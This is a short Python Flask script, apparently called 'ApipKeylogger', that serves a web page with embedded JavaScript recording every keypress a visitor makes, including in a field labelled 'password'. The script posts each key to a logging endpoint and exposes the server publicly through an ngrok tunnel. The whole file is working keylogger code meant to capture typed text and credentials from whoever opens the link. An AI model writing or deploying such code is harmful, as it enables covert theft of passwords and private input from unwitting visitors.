from flask import Flask, request
from pyngrok import ngrok  # Requires pyngrok library

app = Flask(__name__)

@app.route('/')
def index():
    # Serve a simple page with JavaScript keylogger
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <title>ApipKeylogger</title>
            <script>
                document.addEventListener('keypress', function(e) {
                    fetch('/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ key: e.key })
                    });
                });
            </script>
        </head>
        <body>
            <h1>Keylogger Test Page</h1>
            <p>Type something here:</p>
            <input type="text" />
            <p2>password</p2>
            <input type="text"/>
        </body>
        </html>
    '''

@app.route('/log', methods=['POST'])
def log_key():
    # Log the captured key to the console
    data = request.get_json()
    if data and 'key' in data:
        print(f"Key pressed: {data['key']}")
    return '', 204

if __name__ == '__main__':
    # Start Flask server in a background thread
    port = 8080
    print("Starting Flask server...")
    public_url = ngrok.connect(port)  # Expose the server to the internet
    print(f"Public URL: {public_url}")
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=port)
